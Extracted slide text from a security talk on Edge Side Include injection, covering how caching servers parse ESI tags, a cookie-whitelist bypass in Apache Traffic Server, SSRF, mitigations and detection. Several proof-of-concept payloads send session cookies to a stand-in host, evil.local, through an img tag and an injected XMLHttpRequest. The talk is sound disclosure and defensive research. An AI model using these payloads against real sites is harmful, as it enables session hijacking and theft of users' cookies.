Edge Side Include Injection
Abusing Caching Servers into SSRF and Transparent Session Hijacking
By Louis Dion-Marcil GoSecure

Edge Side Includes (ESI)... what is it?

Edge Side Includes (ESI)... what is it?

Edge Side Includes (ESI)... what is it?
The Weather Website
Forecast for Montréal Monday 27°C Tuesday 23°C Wednesday 31°C

Edge Side Includes (ESI)... what is it?

The Weather Website
Forecast for Montréal Monday 27°C Tuesday 23°C Wednesday 31°C

Static Fragment Variable Fragments

Edge Side Includes (ESI)... what is it?
 Adds fragmentation to caching  App Server send fragment markers in HTTP responses
<esi:[action] attr="val" />
 ESI tags are parsed by the HTTP surrogate (load balancer, proxy)  Most engines require specific App Server HTTP Headers

ESI Features & Syntax -- Include
page-1.html:
<html> <p>This is page 1!</p> <esi:include src="/page-2.html" />
</html>
page-2.html:
<p>This is page 2!</p>

ESI Features & Syntax -- Include
$ curl -s http://esi/page-1.html
<html> <p>This is page 1!</p> <p>This is page 2!</p>
</html>

ESI Flow (cache miss)

ESI Flow (cache miss)
/1.html

ESI Flow (cache miss)
/1.html

/1.html

ESI Flow (cache miss)
/1.html

/1.html  1.html + ESI

ESI Flow (cache miss)
/1.html

/1.html
 1.html + ESI
ESI tags processed

ESI Flow (cache miss)
/1.html

/1.html
 1.html + ESI
ESI tags processed
/2.html

ESI Flow (cache miss)
/1.html

/1.html
 1.html + ESI
ESI tags processed
/2.html
 2.html

ESI Flow (cache miss)
/1.html
+

/1.html
 1.html + ESI
ESI tags processed
/2.html
 2.html

ESI Features & Syntax -- Variables
<esi:vars>$(VARIABLE_NAME)</esi:vars>

ESI Features & Syntax -- Variables
<esi:vars>$(VARIABLE_NAME)</esi:vars>

$(HTTP_USER_AGENT) $(QUERY_STRING) $(HTTP_COOKIE)

 Mozilla/5.0 (X11;[...]  city=Montreal&format=C  _ga=[...]&__utma=[...]

ESI Attacks
 ESI tags are sent by the application server  How can the Edge server tell which tags are legitimate?  It can't.

ESI Injection
<p> City: <?= $_GET['city'] ?>
</p>

ESI Injection
<p> City: <?= $_GET['city'] ?>
</p>
<p> City: <esi:vars>$(HTTP_COOKIE{PHPSESSID})</esi:vars>
</p>

ESI Injection
<p> City: <?= $_GET['city'] ?>
</p>
<p> City: <esi:vars>$(HTTP_COOKIE{PHPSESSID})</esi:vars>
</p>

ESI Implementations -- Apache Traffic Server
 Donated by Yahoo! to Apache  ESI stack implemented, with bonus features  Used by Yahoo, Apple

ESI Implementations -- Apache Traffic Server
 Offers Cookie whitelisting  Critical cookies not accessible by ESI... or are they?
<esi:vars>$(HTTP_COOKIE{PHPSESSID})</esi:vars> 

ESI Implementations -- Apache Traffic Server
 Offers Cookie whitelisting  Critical cookies not accessible by ESI... or are they?

<esi:vars>$(HTTP_COOKIE{PHPSESSID})</esi:vars> 

<esi:vars>$(HTTP_HEADER{Cookie})</esi:vars>



ESI Implementations -- Apache Traffic Server
 Offers Cookie whitelisting  Critical cookies not accessible by ESI... or are they?

<esi:vars>$(HTTP_COOKIE{PHPSESSID})</esi:vars> 

<esi:vars>$(HTTP_HEADER{Cookie})</esi:vars>



 "_ga=[...]&PHPSESSID=b9gcvscc[...]"

DEMO -- Proof of concept
<img src=" //evil.local/u<esseir:nvaamres=>a$t(tHaTcTkPe_rH;EsAeDsEsRi{oCno_ockoioek}i)e<=/se%s3iA:Nvpa.r.s.> ">

DEMO -- Proof of concept
<img src=" //evil.local/u<esseir:nvaamres=>a$t(tHaTcTkPe_rH;EsAeDsEsRi{oCno_ockoioek}i)e<=/se%s3iA:Nvpa.r.s.> ">

DEMO -- Proof of concept
<img src=" //evil.local/username=attacker;session_cookie=s%3ANp... ">

DEMO -- Proof of concept

Internet

http://evil.local/username=attacker;session_cookie=s%3A...

DEMO
Now we know...  ... we can inject ESI tags,
 ... we can leak sensitive cookies.

ESI Implementations -- Oracle Web Cache (for WebLogic)
 Part of the 11g suite  Usually serves WebLogic Application Servers  Initial ESI specification implemented, plus features

DEMO -- Proof of concept
<esi:inline name="/js/jquery.js" />
var x = new XMLHttpRequest();
x.open("GET", "//evil.local/? <esi:vars>$(HTTP_COOKIE{session_cookie})</esi:vars>");
x.send();
</esi:inline>

DEMO -- Proof of concept
<esi:inline name="/js/jquery.js" />
var x = new XMLHttpRequest();
x.open("GET", "//evil.local/? <esi:vars>$(HTTP_COOKIE{session_cookie})</esi:vars>");
x.send();
</esi:inline>

DEMO -- Proof of concept
<esi:inline name="/js/jquery.js" />
var x = new XMLHttpRequest();
x.open("GET", "//evil.local/?lHKlM77VbP79hDnMX2Gg...");
x.send();
</esi:inline>

DEMO -- Proof of concept

Internet

http://evil.local/?lHKlM77VbP79hDnMX2Gg...

ESI - Mitigations
 Escaping!
{ "first_name": "Louis",
"last_name": "<esi:include src=\"/page-2.html\" />"
}

ESI - Mitigations

Invalid ESI tag!

 Escaping!

{ "first_name": "Louis",
"last_name": "<esi:include src=\"/page-2.html\" />"
}

ESI - Mitigations

Invalid ESI tag!

 Escaping! Encoding!

{ "first_name": "Louis",
"last_name": "<esi:include src=\"/page-2.html\" />"
}

 Escaping? Encoding?This is valid with Apache Traffic Server...

{ "first_name": "Louis", "last_name": "<esi:include src=/foobar />"
}

SSRF with Apache Traffic Server

SSRF with Apache Traffic Server

SSRF with Apache Traffic Server

ESI -- SSRF Flow
/api/me
+

/api/me

/api/me + ESI
ESI tags processed
/server-status
 server-status

ESI -- Manual Detection
FOO<!--esi -->BAR 
FOO<!--foo -->BAR 

FOOBAR



FOO<!--foo -->BAR 

ESI -- Automatic Detection
 Burp ActiveScan++  Burp Upload Scanner  Acunetix

ESI - Migration
 Cloudflare Workers https://gist.github.com/Overbryd/c070bb1fa769609d404f648c d506340f

Questions?
Detailed blogpost of our prior research: https://gosecure.net/2018/04/03/beyond-xss-edge-side-include-injection/
By Louis Dion-Marcil GoSecure

